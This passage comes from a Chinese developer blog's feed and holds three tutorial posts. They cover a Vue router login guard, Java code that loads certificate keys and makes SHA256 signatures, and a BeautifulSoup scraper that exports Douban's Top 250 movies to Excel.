class_">Cookies</span>.<span class="title function_">get</span>(<span class="string">&#x27;MySystemToken&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断是否已经登录</span></span><br><span class="line">    <span class="keyword">if</span> (hasToken) &#123;</span><br><span class="line">        <span class="keyword">if</span> (to.<span class="property">path</span> === <span class="string">&#x27;/login&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果已经是登录状态，访问登录页面，则强制跳转到主页</span></span><br><span class="line">            <span class="title function_">next</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>&#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 判断 store 里是否已经已经有信息，如果没有则需要调接口获取</span></span><br><span class="line">            <span class="keyword">const</span> hasGetUserInfo = store.<span class="property">getters</span>.<span class="property">name</span></span><br><span class="line">            <span class="keyword">if</span> (hasGetUserInfo) &#123;</span><br><span class="line">                <span class="comment">// 有了信息的话，正常执行</span></span><br><span class="line">                <span class="title function_">next</span>()</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果 store 没有信息，则调接口获取</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 调用 store 里面定义的 user/getInfo 方法获取 user 信息</span></span><br><span class="line">                    <span class="keyword">await</span> store.<span class="title function_">dispatch</span>(<span class="string">&#x27;user/getInfo&#x27;</span>)</span><br><span class="line">                    <span class="title function_">next</span>()</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    <span class="comment">// 如果获取用户状态失败，一般是指 token 已获取或者错误，则清除 token，跳转到登录页重新登录</span></span><br><span class="line">                    <span class="keyword">await</span> store.<span class="title function_">dispatch</span>(<span class="string">&#x27;user/resetToken&#x27;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">                    <span class="title function_">next</span>(<span class="string">`/login?redirect=<span class="subst">$&#123;to.path&#125;</span>`</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果在白名单页面，则继续；否则跳转到登录页面</span></span><br><span class="line">        <span class="keyword">if</span> (whiteList.<span class="title function_">indexOf</span>(to.<span class="property">path</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">next</span>()</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">next</span>(<span class="string">`/login?redirect=<span class="subst">$&#123;to.path&#125;</span>`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>写完权限判断逻辑，只需在<code>vue</code>框架入口的<code>main.js</code>中引入即可，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ./permission</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在对需要做登录的系统前端页面访问做控制时，可以用&lt;code&gt;router&lt;/code&gt;的&lt;code&gt;beforeEach&lt;/code&gt;方式来对跳转到的路径做管理。如果访问的路径在路径白名单内，则可以继续访问，如果不在，则判断用户是否登录，如果未登录，则被强制跳转到登录页面。</summary>
      
    
    
    
    <category term="Vue" scheme="https://blog.zhengxiangling.com/categories/Vue/"/>
    
    
    <category term="vue" scheme="https://blog.zhengxiangling.com/tags/vue/"/>
    
    <category term="vue-router" scheme="https://blog.zhengxiangling.com/tags/vue-router/"/>
    
  </entry>
  
  <entry>
    <title>Java 读取公钥、私钥，SHA256算法加签、验签</title>
    <link href="https://blog.zhengxiangling.com/2019/12/05/Java-%E8%AF%BB%E5%8F%96%E5%85%AC%E9%92%A5%E3%80%81%E7%A7%81%E9%92%A5%EF%BC%8C%E5%8A%A0%E7%AD%BE%E3%80%81%E9%AA%8C%E7%AD%BE/"/>
    <id>https://blog.zhengxiangling.com/2019/12/05/Java-%E8%AF%BB%E5%8F%96%E5%85%AC%E9%92%A5%E3%80%81%E7%A7%81%E9%92%A5%EF%BC%8C%E5%8A%A0%E7%AD%BE%E3%80%81%E9%AA%8C%E7%AD%BE/</id>
    <published>2019-12-05T07:27:00.000Z</published>
    <updated>2023-11-17T14:27:30.002Z</updated>
    
    <content type="html"><![CDATA[<p>最近在做利用私钥加签，和对加签串利用公钥验签，作如下总结：</p><span id="more"></span><h2 id="读取公钥"><a href="#读取公钥" class="headerlink" title="读取公钥"></a>读取公钥</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> PublicKey <span class="title function_">getPublicKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;公钥 cer 路径&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="comment">// 创建X509工厂类</span></span><br><span class="line">        <span class="type">CertificateFactory</span> <span class="variable">cf</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X.509&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建证书对象</span></span><br><span class="line">        <span class="type">X509Certificate</span> <span class="variable">cert</span> <span class="operator">=</span> (X509Certificate) cf</span><br><span class="line">                .generateCertificate(inStream);</span><br><span class="line">        inStream.close();</span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">publicKey</span> <span class="operator">=</span> cert.getPublicKey();</span><br><span class="line">        <span class="keyword">return</span> publicKey;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="读取私钥"><a href="#读取私钥" class="headerlink" title="读取私钥"></a>读取私钥</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> PrivateKey <span class="title function_">getPrivateKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">keyStorePath</span> <span class="operator">=</span> <span class="string">&quot;私钥 pfx 地址&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;密码&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化密钥库，默认JKS类型</span></span><br><span class="line">        <span class="type">KeyStore</span> <span class="variable">ks</span> <span class="operator">=</span> KeyStore.getInstance(<span class="string">&quot;PKCS12&quot;</span>);</span><br><span class="line">        <span class="comment">// 获得密钥库文件流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(keyStorePath);</span><br><span class="line">        <span class="comment">// 加载密钥库</span></span><br><span class="line">        ks.load(is, password.toCharArray());</span><br><span class="line">        <span class="comment">// 关闭密钥库文件流</span></span><br><span class="line">        is.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//私钥</span></span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">aliases</span> <span class="operator">=</span> ks.aliases();</span><br><span class="line">        <span class="type">String</span> <span class="variable">keyAlias</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (aliases.hasMoreElements())&#123;</span><br><span class="line">            keyAlias = (String)aliases.nextElement();</span><br><span class="line">            System.out.println(<span class="string">&quot;p12&#x27;s alias-----&gt;&quot;</span>+keyAlias);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (PrivateKey) ks.getKey(keyAlias, password.toCharArray());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加签"><a href="#加签" class="headerlink" title="加签"></a>加签</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 私钥加签</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> unsignstr 需要加签的拼接串</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> 加签串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">GetSign</span><span class="params">(String unsignstr)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">byte</span>[] signed = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> getPrivateKey();</span><br><span class="line">        <span class="type">String</span> <span class="variable">privateKeyValue</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(privateKey.getEncoded());</span><br><span class="line">        System.out.println(<span class="string">&quot;私钥-------------&gt;&quot;</span> + privateKeyValue);</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">Sign</span> <span class="operator">=</span> Signature.getInstance(SIGNATURE_ALGORITHM);</span><br><span class="line">        Sign.initSign(privateKey);</span><br><span class="line"></span><br><span class="line">        System.out.println(unsignstr);</span><br><span class="line">        <span class="type">byte</span>[] outputDigest_sign = unsignstr.getBytes();</span><br><span class="line">        Sign.update(outputDigest_sign);</span><br><span class="line">        signed = Sign.sign();</span><br><span class="line">        signature = Base64.getEncoder().encodeToString(signed);</span><br><span class="line">        logger.info(signature);</span><br><span class="line">        System.out.println(signature);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> signature;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="验签"><a href="#验签" class="headerlink" title="验签"></a>验签</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 公钥验签</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> requsetBody 验签报文</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> signature 验签串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">read_cer_and_verify_sign</span><span class="params">(String requsetBody, String signature)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;公钥路径&quot;</span>;</span><br><span class="line">    <span class="type">X509Certificate</span> <span class="variable">cert</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">CertificateFactory</span> <span class="variable">cf</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X.509&quot;</span>);</span><br><span class="line">        cert = (X509Certificate) cf</span><br><span class="line">                .generateCertificate(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(filePath)));</span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">publicKey</span> <span class="operator">=</span> cert.getPublicKey();</span><br><span class="line">        <span class="type">String</span> <span class="variable">publicKeyString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(publicKey</span><br><span class="line">                .getEncoded()));</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------公钥--------------------&quot;</span>);</span><br><span class="line">        System.out.println(publicKeyString);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------公钥--------------------&quot;</span>);</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">verifySign</span> <span class="operator">=</span> Signature.getInstance(SIGNATURE_ALGORITHM);</span><br><span class="line">        verifySign.initVerify(publicKey);</span><br><span class="line">        <span class="comment">// 用于验签的数据</span></span><br><span class="line">        System.out.println(<span class="string">&quot;requestBody is &quot;</span> + requsetBody);</span><br><span class="line">        verifySign.update(requsetBody.getBytes());</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> verifySign.verify(Base64.getDecoder().decode(signature));</span><br><span class="line">        System.out.println(<span class="string">&quot;verifySign is &quot;</span> + flag);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidKeyException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SignatureException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CertificateException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在做利用私钥加签，和对加签串利用公钥验签，作如下总结：&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="https://blog.zhengxiangling.com/categories/java/"/>
    
    
    <category term="java" scheme="https://blog.zhengxiangling.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>beautifulSoup爬取同步加载页面数据</title>
    <link href="https://blog.zhengxiangling.com/2019/11/15/beautifulSoup%E7%88%AC%E5%8F%96%E5%90%8C%E6%AD%A5%E5%8A%A0%E8%BD%BD%E9%A1%B5%E9%9D%A2%E6%95%B0%E6%8D%AE/"/>
    <id>https://blog.zhengxiangling.com/2019/11/15/beautifulSoup%E7%88%AC%E5%8F%96%E5%90%8C%E6%AD%A5%E5%8A%A0%E8%BD%BD%E9%A1%B5%E9%9D%A2%E6%95%B0%E6%8D%AE/</id>
    <published>2019-11-15T03:00:00.000Z</published>
    <updated>2023-11-17T14:27:30.004Z</updated>
    
    <content type="html"><![CDATA[<p>beautifulSoup 可以很方便的获取 html 页面的标签节点，而且也很容易获取到标签的属性和文本内容。我们就运用 beautifulSoup 来爬取同步加载页面数据，然后我们将获取到的数据存入到 excel 中。</p><span id="more"></span><h2 id="爬取同步加载页面数据"><a href="#爬取同步加载页面数据" class="headerlink" title="爬取同步加载页面数据"></a>爬取同步加载页面数据</h2><p>我们这里爬取豆瓣电影Top 250 的数据做描述，<code>request</code>库请求页面，<code>beautifulSoup</code>用来获取页面节点，所使用到的库自行安装。</p><h3 id="获取页面源码"><a href="#获取页面源码" class="headerlink" title="获取页面源码"></a>获取页面源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">from chardet import detect</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_soup(page_url):</span><br><span class="line">    &quot;&quot;&quot;获取源码&quot;&quot;&quot;</span><br><span class="line">    with request.urlopen(page_url) as fp:</span><br><span class="line">        byt = fp.read()</span><br><span class="line">        det = detect(byt)</span><br><span class="line">        return BeautifulSoup(byt.decode(det[&#x27;encoding&#x27;]), &#x27;lxml&#x27;)</span><br></pre></td></tr></table></figure><p><code>page_url</code>为页面地址，<code>lxml</code>为<code>python</code>库自行安装。</p><h3 id="获取页面数据"><a href="#获取页面数据" class="headerlink" title="获取页面数据"></a>获取页面数据</h3><p>我们运用<code>beautifulSoup</code>来获取页面的数据，数据一般存放在页面的节点内容中（如：标题、价格、数量）和节点的属性中（图片链接），所以我们需要找到这些存放数据的相应节点。</p><p><img src="https://cdn.zhengxiangling.com/superbed/2019/11/15/5dce0edf8e0e2e3ee92f82d9.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/superbed/2019/11/15/5dce0edf8e0e2e3ee92f82d9.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="douban电影top250数据节点"></p><p>我们需要从中找到一些规律，每部电影的数据都存放在一个<code>li</code>中，所有的<code>li</code>都存放在一个<code>ol</code>中，图片的链接在<code>li</code>的<code>img</code>标签的<code>src</code>属性中，其他的数据都放在带有<code>class</code>属性的<code>span</code>标签中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># 正则式</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def get_data(page):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    获取数据</span><br><span class="line">    selelct 可以用css语法获取标签，find可以获取标签里的 attrs 属性值</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    data = []</span><br><span class="line">    ol = page.find(&#x27;ol&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;grid_view&#x27;&#125;)</span><br><span class="line">    for li in ol.select(&#x27;li&#x27;):</span><br><span class="line">        # 单元</span><br><span class="line">        tmp = []</span><br><span class="line">        # 多个 title</span><br><span class="line">        titles = []</span><br><span class="line">        img_url = li.find(&#x27;img&#x27;).attrs[&#x27;src&#x27;].strip()</span><br><span class="line">        tmp.append(img_url)</span><br><span class="line">        for span in li.findAll(&#x27;span&#x27;, attrs=&#123;&quot;class&quot;: re.compile(&#x27;&#x27;)&#125;):</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;title&#x27;:</span><br><span class="line">                titles.append(span.string.strip())</span><br><span class="line">            # 评价</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;rating_num&#x27;:</span><br><span class="line">                tmp.append(span.string.strip())</span><br><span class="line">            # 简评</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;inq&#x27;:</span><br><span class="line">                tmp.append(span.string.strip())</span><br><span class="line">        tmp.insert(0, titles)</span><br><span class="line">        data.append(tmp)</span><br><span class="line">    return data</span><br></pre></td></tr></table></figure><h3 id="获取下一页的数据"><a href="#获取下一页的数据" class="headerlink" title="获取下一页的数据"></a>获取下一页的数据</h3><p>我们先需要在页面中找到下一页数据请求的参数<br><img src="https://cdn.zhengxiangling.com/superbed/2019/11/15/5dce1b588e0e2e3ee931cd7c.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/superbed/2019/11/15/5dce1b588e0e2e3ee931cd7c.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="下一页按钮"><br>我们可以看到下一页的参数为<code>?start=25&amp;filter=</code>，所以获取到这个参数然后加入到之前的网址当中，获取到的数据就是下一页的数据了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def next_url(page):</span><br><span class="line">    &quot;&quot;&quot;获取下一页链接后缀&quot;&quot;&quot;</span><br><span class="line">    a = page.find(&#x27;a&#x27;, text=re.compile(&quot;^后页&quot;))</span><br><span class="line">    if a:</span><br><span class="line">        return a.attrs[&#x27;href&#x27;]</span><br><span class="line">    else:</span><br><span class="line">        return None</span><br></pre></td></tr></table></figure><h3 id="保存数据到-excel-中"><a href="#保存数据到-excel-中" class="headerlink" title="保存数据到 excel 中"></a>保存数据到 excel 中</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import xlwt</span><br><span class="line"></span><br><span class="line">def xls_save(workbook, data, count):</span><br><span class="line">    &quot;&quot;&quot;保存数据到excel&quot;&quot;&quot;</span><br><span class="line">    for d in data:</span><br><span class="line">        for i in range(len(d)):</span><br><span class="line">            # print(d[i])</span><br><span class="line">            workbook.write(count, i, d[i])</span><br><span class="line">        count = count + 1</span><br><span class="line">    return workbook, count</span><br></pre></td></tr></table></figure><p><code>xlwt</code>为<code>python</code>库自行安装，<code>workbook</code>为要保存的<code>excel</code>对象，<code>data</code>为<code>beautifulSoup</code>对象，<code>count</code>为要写入数据的行数。</p><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># 爬取豆瓣电影 top250</span><br><span class="line"></span><br><span class="line">from urllib import request</span><br><span class="line">from chardet import detect</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line">import xlwt</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_soup(page_url):</span><br><span class="line">    &quot;&quot;&quot;获取源码&quot;&quot;&quot;</span><br><span class="line">    with request.urlopen(page_url) as fp:</span><br><span class="line">        byt = fp.read()</span><br><span class="line">        det = detect(byt)</span><br><span class="line">        return BeautifulSoup(byt.decode(det[&#x27;encoding&#x27;]), &#x27;lxml&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_data(page):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    获取数据</span><br><span class="line">    selelct 可以用css语法获取标签，find可以获取标签里的 attrs 属性值</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    data = []</span><br><span class="line">    ol = page.find(&#x27;ol&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;grid_view&#x27;&#125;)</span><br><span class="line">    for li in ol.select(&#x27;li&#x27;):</span><br><span class="line">        # 单元</span><br><span class="line">        tmp = []</span><br><span class="line">        # 多个 title</span><br><span class="line">        titles = []</span><br><span class="line">        img_url = li.find(&#x27;img&#x27;).attrs[&#x27;src&#x27;].strip()</span><br><span class="line">        tmp.append(img_url)</span><br><span class="line">        for span in li.findAll(&#x27;span&#x27;, attrs=&#123;&quot;class&quot;: re.compile(&#x27;&#x27;)&#125;):</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;title&#x27;:</span><br><span class="line">                titles.append(span.string.strip())</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;rating_num&#x27;:</span><br><span class="line">                tmp.append(span.string.strip())</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;inq&#x27;:</span><br><span class="line">                tmp.append(span.string.strip())</span><br><span class="line">        tmp.insert(0, titles)</span><br><span class="line">        data.append(tmp)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def next_url(page):</span><br><span class="line">    &quot;&quot;&quot;获取下一页链接后缀&quot;&quot;&quot;</span><br><span class="line">    a = page.find(&#x27;a&#x27;, text=re.compile(&quot;^后页&quot;))</span><br><span class="line">    if a:</span><br><span class="line">        return a.attrs[&#x27;href&#x27;]</span><br><span class="line">    else:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def xls_save(workbook, data, count):</span><br><span class="line">    &quot;&quot;&quot;保存数据到excel&quot;&quot;&quot;</span><br><span class="line">    for d in data:</span><br><span class="line">        for i in range(len(d)):</span><br><span class="line">            # print(d[i])</span><br><span class="line">            workbook.write(count, i, d[i])</span><br><span class="line">        count = count + 1</span><br><span class="line">    return workbook, count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;https://movie.douban.com/top250&#x27;</span><br><span class="line">    soup = get_soup(url)</span><br><span class="line">    # print(get_data(soup))</span><br><span class="line">    path = os.path.join(os.getcwd() + &quot;\\&quot; + 